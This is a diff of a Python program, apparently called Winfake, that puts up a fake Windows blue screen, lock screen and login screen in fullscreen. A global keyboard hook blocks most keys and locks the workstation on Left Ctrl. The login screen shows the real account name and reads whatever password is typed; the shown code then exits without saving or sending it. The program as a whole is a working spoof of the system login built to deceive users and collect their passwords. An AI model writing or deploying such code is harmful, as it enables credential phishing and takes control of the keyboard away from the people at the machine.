@@ -1,12 +1,12 @@
 from comtypes import CLSCTX_ALL
 import ctypes
 import os
-from PIL import ImageTk, Image, ImageDraw, ImageOps
+from PIL import Image, ImageDraw, ImageFilter, ImageOps, ImageTk
 from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
 import pyHook
-import pythoncom
 import random
 import screeninfo
+import sys
 import threading
 import time
 import tkinter
@@ -15,28 +15,7 @@ from tkinter.font import Font
 from config import *
 
 
-class KeyBlocker(threading.Thread):
-
-    def __init__(self):
-        threading.Thread.__init__(self)
-        self.daemon = True
-        self.start()
-
-    def run(self):
-        hook_manager = pyHook.HookManager()
-        hook_manager.KeyDown = self.press
-        hook_manager.HookKeyboard()
-        pythoncom.PumpMessages()
-
-    def press(self, event):
-        if event.Key.lower() in ["lcontrol", "delete"]:
-            ctypes.windll.user32.LockWorkStation()
-        elif event.Key.lower() == "escape":
-            return True
-        return False
-
-
-class IncreaseProgress(threading.Thread):
+class BluescreenProgress(threading.Thread):
 
     def __init__(self, winfake, *args, **kwargs):
         threading.Thread.__init__(self, *args, **kwargs)
@@ -61,14 +40,45 @@ class IncreaseProgress(threading.Thread):
                 self.winfake.blackscreen.wm_attributes("-topmost", True)
                 time.sleep(random.randint(3, 10))
                 self.winfake.blackscreen.wm_attributes("-topmost", False)
-                self.winfake.create_loginscreen()
+                self.winfake.create_lockscreen()
                 break
+
+
+class LockscreenAnimation(threading.Thread):
+
+    def __init__(self, winfake, *args, **kwargs):
+        threading.Thread.__init__(self, *args, **kwargs)
+        self.daemon = True
+
+        self.winfake = winfake
+
+        self.start()
+
+    def run(self):
+        while self.winfake.lockscreen.coords(self.winfake.lockscreen_ethernet_icon_ref)[1] > -100:
+            time.sleep(0.005)
+            self.winfake.lockscreen.move(self.winfake.lockscreen_localtime_ref, 0, -100)
+            self.winfake.lockscreen.move(self.winfake.lockscreen_localdate_ref, 0, -100)
+            self.winfake.lockscreen.move(self.winfake.lockscreen_ethernet_icon_ref, 0, -100)
+        self.winfake.create_loginscreen()
+        self.winfake.lockscreen.destroy()
 
 
 class Winfake():
 
     def __init__(self):
-        KeyBlocker()
+        self.block = True
+
+        def press(event):
+            if event.Key.lower() == "lcontrol":
+                ctypes.windll.user32.LockWorkStation()
+            elif event.Key.lower() == "escape" or event.Key.lower() == "space":
+                return True
+            return not self.block
+
+        self.hook_manager = pyHook.HookManager()
+        self.hook_manager.KeyDown = press
+        self.hook_manager.HookKeyboard()
 
         self.screen = tkinter.Tk()
         self.screen.title("")
@@ -91,7 +101,7 @@ class Winfake():
 
         # self.create_blackscreen()
         # self.create_bluescreen()
-        # IncreaseProgress(self)
+        # BluescreenProgress(self)
         self.create_lockscreen()
 
         self.screen.mainloop()
@@ -112,21 +122,9 @@ class Winfake():
 
     def load_images(self):
         self.qr_code_image = tkinter.PhotoImage(file = f"{IMAGES_PATH}qr_code.png")
-        self.lockscreen_image = ImageTk.PhotoImage(Image.open(f"{IMAGES_PATH}lockscreen.jpg").resize((self.width_primary, self.height_primary)))
-        self.internet_icon = ImageTk.PhotoImage(Image.open(f"{IMAGES_PATH}internet_icon.jpg").resize((32, 32)))
-        self.background_image = ImageTk.PhotoImage(Image.open(f"{IMAGES_PATH}background.jfif").resize((self.width_primary, self.height_primary)))
-        self.profile_image = self.shaping_profile_image()
-
-    def shaping_profile_image(self):
-        profile_image = Image.open(f"{IMAGES_PATH}user.png").resize((self.width_primary//10, self.width_primary//10))
-        mask = Image.new("L", (profile_image.size[0]*10, profile_image.size[1]*10), 0)
-        draw = ImageDraw.Draw(mask)
-        draw.ellipse((0, 0) + mask.size, fill = 255)
-        mask = mask.resize(profile_image.size, Image.ANTIALIAS)
-        profile_image = ImageOps.fit(profile_image, mask.size, centering = (0.5, 0.5))
-        profile_image.putalpha(mask)
-        profile_image = ImageTk.PhotoImage(profile_image)
-        return profile_image
+        self.background_image = ImageTk.PhotoImage(Image.open(f"{IMAGES_PATH}background.jpg").resize((self.width_primary, self.height_primary)))
+        self.background_image_blurred = ImageTk.PhotoImage(Image.open(f"{IMAGES_PATH}background.jpg").resize((self.width_primary, self.height_primary)).filter(ImageFilter.GaussianBlur(30)))
+        self.profile_image = ImageTk.PhotoImage(Image.open(f"{IMAGES_PATH}user.png").resize((self.width_primary//12, self.width_primary//12)))
 
     def load_error_codes(self):
         with open(f"{DOCUMENTS_PATH}error_codes", "r") as error_codes_file:
@@ -156,70 +154,114 @@ class Winfake():
         self.bluescreen.place(x = -2, y = -2)
         self.bluescreen.create_text(200, 150, anchor = "nw", fill = "white", font = self.font_big, text = ":(")
         self.bluescreen.create_text(210, 420, anchor = "nw", fill = "white", font = self.font, text = "Your PC ran into a problem and needs to restart. We're\njust collecting some error info, and then we'll restart for\nyou.")
-        self.bluescreen.create_text(210, 620, anchor = "nw", fill = "white", font = self.font, text = "0% complete", tag="progress")
+        self.bluescreen.create_text(210, 620, anchor = "nw", fill = "white", font = self.font, text = "0% complete", tag = "progress")
         self.bluescreen.create_text(350, 725, anchor = "nw", fill = "white", font = self.font_small, text = "For more information about this issue and possible fixes, visit https://www.windows.com/stopcode")
         self.bluescreen.create_text(350, 800, anchor = "nw", fill = "white", font = self.font_tiny, text = "If you call a support person, give them this info:")
         self.bluescreen.create_text(350, 830, anchor = "nw", fill = "white", font = self.font_tiny, text = "Stop code: " + random.choice(self.error_codes).split(" ")[1])
         self.bluescreen.create_image(210, 730, anchor = "nw", image = self.qr_code_image)
 
+    def create_loadingscreen(self):
+        self.loadingscreen = tkinter.Canvas(self.screen, bd = 0, bg = "#000000", width = self.width_primary, height = self.height_primary)
+        self.loadingscreen.place(x = -2, y = -2)
+
+
     def create_lockscreen(self):
         self.screen.config(cursor = "arrow")
+
         self.lockscreen = tkinter.Canvas(self.screen, bd = 0, width = self.width_primary, height = self.height_primary)
         self.lockscreen.place(x = -2, y = -2)
-        self.lockscreen.create_image(2, 2, anchor = "nw", image = self.lockscreen_image)
-        self.lockscreen.create_image(self.width_primary*0.96, self.height_primary*0.93, anchor = "nw", image = self.internet_icon)
+        self.lockscreen.create_image(2, 2, anchor = "nw", image = self.background_image)
         localtime = time.strftime("%H:%M", time.localtime())
-        self.lockscreen.create_text(60, self.height_primary*0.65, anchor = "nw", fill = "white", font = Font(family = "Segoe UI Light", size = 130), text = f"{localtime}")
+        self.lockscreen_localtime_ref = self.lockscreen.create_text(80, self.height_primary*0.7, anchor = "nw", fill = "white", font = Font(family = "Segoe UI Light", size = 110), text = f"{localtime}")
         localdate = time.strftime("%A, %d %B", time.localtime())
-        self.lockscreen.create_text(60, self.height_primary*0.8, anchor = "nw", fill = "white", font = Font(family = "Segoe UI Light", size = 60), text = f"{localdate}")
+        self.lockscreen_localdate_ref = self.lockscreen.create_text(80, self.height_primary*0.82, anchor = "nw", fill = "white", font = Font(family = "Segoe UI Light", size = 50), text = f"{localdate}")
+        self.lockscreen_ethernet_icon_ref = self.lockscreen.create_text(self.width_primary*0.96, self.height_primary*0.93, anchor = "nw", fill = "white", font = Font(family = "Segoe MDL2 Assets", size = 18), text = "\uE839")
+        self.lockscreen.bind("<Button-1>", lambda _: LockscreenAnimation(self))
+        self.lockscreen.bind("<space>", lambda _: LockscreenAnimation(self))
+        self.lockscreen.focus_set()
 
     def create_loginscreen(self):
-
-        def entry_focus_in(_):
-            self.loginscreen.attributes("-alpha", 1)
-            entry.config(foreground = "#999999", background = "#FEFEFE")
-            entry.icursor(0)
-
-        def entry_focus_out(_):
-            self.loginscreen.attributes("-alpha", 0.5)
-            entry.config(foreground = "#FEFEFE", background = "#000000")
-
-        def entry_enter(_):
-            entry_frame.config(background = "#FEFEFE")
-
-        def entry_leave(_):
-            entry_frame.config(background = "#AAAAAA")
+        self.block = False
 
         self.screen.config(cursor = "arrow")
-        background = tkinter.Canvas(self.screen, border = 0, width = self.width_primary, height = self.height_primary)
-        background.place(x = -2, y = -2)
-        background.create_image(2, 2, anchor = "nw", image = self.background_image)
-        background.create_image(self.width_primary/2, self.height_primary/2-170, image = self.profile_image)
+
+        self.loginscreen = tkinter.Canvas(self.screen, border = 0, width = self.width_primary, height = self.height_primary)
+        self.loginscreen.place(x = -2, y = -2)
+        self.loginscreen.create_image(2, 2, anchor = "nw", image = self.background_image_blurred)
+        self.loginscreen.create_image(self.width_primary/2, self.height_primary/2-150, image = self.profile_image)
 
         # C:\Users\user\AppData\Roaming\Microsoft\Windows\AccountPictures
         username = os.getlogin()
-        background.create_text(self.width_primary/2, self.height_primary/2, fill = "white", font = self.font_large, text = username)
+        self.loginscreen.create_text(self.width_primary/2, self.height_primary/2+20, fill = "white", font = self.font_large, text = username)
 
-        self.loginscreen = tkinter.Toplevel()
-        self.loginscreen.bind("<FocusOut>", lambda _: self.loginscreen.wm_attributes("-topmost", True))
-        self.loginscreen.overrideredirect(True)
-        self.loginscreen.resizable(False, False)
-        self.loginscreen.wm_attributes("-topmost", True)
-        self.loginscreen.attributes("-alpha", 0.5)
-        self.loginscreen.wm_geometry(f"+{self.width_primary//2-180}+{self.height_primary//2+90}")
-        entry_frame = tkinter.Frame(self.loginscreen, border = 2, background = "#AAAAAA", relief = "flat")
-        entry_frame.pack()
-        entry_frame.bind
-        password = tkinter.StringVar()
-        entry = tkinter.Entry(entry_frame, width = 30, border = 8, foreground = "#FEFEFE", background = "#000000", relief = "flat", font = "Calibri", textvariable = password, exportselection = 0)
-        entry.pack(side = "left")
-        entry.bind("<FocusIn>", entry_focus_in)
-        entry.bind("<FocusOut>", entry_focus_out)
-        entry.bind("<Enter>", entry_enter)
-        entry.bind("<Leave>", entry_leave)
-        entry.insert(0, "Password")
-        button = tkinter.Button(entry_frame, width = 3, border = 0, foreground = "#FEFEFE", background = "#777777", relief = "flat", font = self.entry_font_big, text = "→")
-        button.pack(side = "right")
+        def entry_frame_enter(event):
+            self.entry_frame.config(background = "#FFFFFF")
+
+        def entry_frame_leave(event):
+            self.entry_frame.config(background = "#999999")
+
+        self.entry_frame = tkinter.Frame(self.screen, border = 2, background = "#999999", relief = "flat")
+        self.entry_frame.place(x = self.width_primary/2, y = self.height_primary/2+120, height = 45, width = 350, anchor = "center")
+        self.entry_frame.bind("<Enter>", entry_frame_enter)
+        self.entry_frame.bind("<Leave>", entry_frame_leave)
+
+        def set_cursor(event):
+            self.screen.after_idle(self.entry.icursor, 0)
+            self.entry.icursor(0)
+
+        def is_valid(character):
+            if character.isalpha() or character.isdigit():
+                return True
+            return False
+
+        def entry_reveal(event):
+            self.entry.config(show = "")
+
+        def entry_hide(event):
+            self.entry.config(show = "\u25CF")
+
+        def entry_check(event):
+            value = self.entry.get()
+            if value == "Password" and is_valid(event.char):
+                self.entry.delete(0, "end")
+                self.entry.config(foreground = "#000000", show = "\u25CF")
+                self.entry.unbind("<Button-1>")
+
+                self.reveal_button = tkinter.Button(self.entry_frame, width = 5, border = 0, foreground = "#555555", background = "#FFFFFF", activeforeground = "#FFFFFF", activebackground = "#666666", relief = "flat", font = Font(family = "Segoe MDL2 Assets", size = 12), text = "\uF78D")
+                self.reveal_button.place(x = 266, y = 0, height = 41)
+                self.reveal_button.bind("<ButtonPress-1>", entry_reveal)
+                self.reveal_button.bind("<ButtonRelease-1>", entry_hide)
+            elif len(value) == 1 and event.keycode == 8:
+                self.entry.delete(0)
+                self.entry.insert(0, "Password")
+                self.entry.icursor(0)
+                self.entry.config(foreground = "#555555", show = "")
+                self.entry.bind("<Button-1>", set_cursor)
+
+                self.reveal_button.destroy()
+
+        def entry_enter(event = None):
+            password = self.entry.get()
+            sys.exit(0)
+
+        self.entry_value = tkinter.StringVar()
+        self.entry = tkinter.Entry(self.entry_frame, width = 36, border = 9, foreground = "#555555", background = "#FFFFFF", selectforeground = "#FFFFFF", selectbackground = "#767676", relief = "flat", font = Font(family = "Segoe UI Semilight", size = 12), textvariable = self.entry_value, exportselection = 0)
+        self.entry.pack(side = "left")
+        self.entry.insert(0, "Password")
+        self.entry.icursor(0)
+        self.entry.focus_set()
+        self.entry.bind("<Button-1>", set_cursor)
+        self.entry.bind("<Key>", entry_check)
+        self.entry.bind("<Return>", entry_enter)
+
+        self.enter_button = tkinter.Button(self.entry_frame, width = 4, height = 2, border = 0, foreground = "#FFFFFF", background = "#777777", activeforeground = "#FFFFFF", activebackground = "#AAAAAA", relief = "flat", font = Font(family = "Segoe MDL2 Assets", size = 14), text = "\uE0AB", command = entry_enter)
+        self.enter_button.pack(side = "right")
+
+        self.loginscreen.create_text(self.width_primary*0.9075, self.height_primary*0.958, anchor = "nw", fill = "white", font = Font(family = "Segoe UI", size = 13), text = "ENG")
+        self.loginscreen.create_text(self.width_primary*0.93, self.height_primary*0.955, anchor = "nw", fill = "white", font = Font(family = "Segoe MDL2 Assets", size = 25), text = "\uE839")
+        self.loginscreen.create_text(self.width_primary*0.9525, self.height_primary*0.955, anchor = "nw", fill = "white", font = Font(family = "Segoe MDL2 Assets", size = 25), text = "\uE776")
+        self.loginscreen.create_text(self.width_primary*0.975, self.height_primary*0.955, anchor = "nw", fill = "white", font = Font(family = "Segoe MDL2 Assets", size = 25), text = "\uE7E8")
+
 
 
 if __name__ == "__main__":
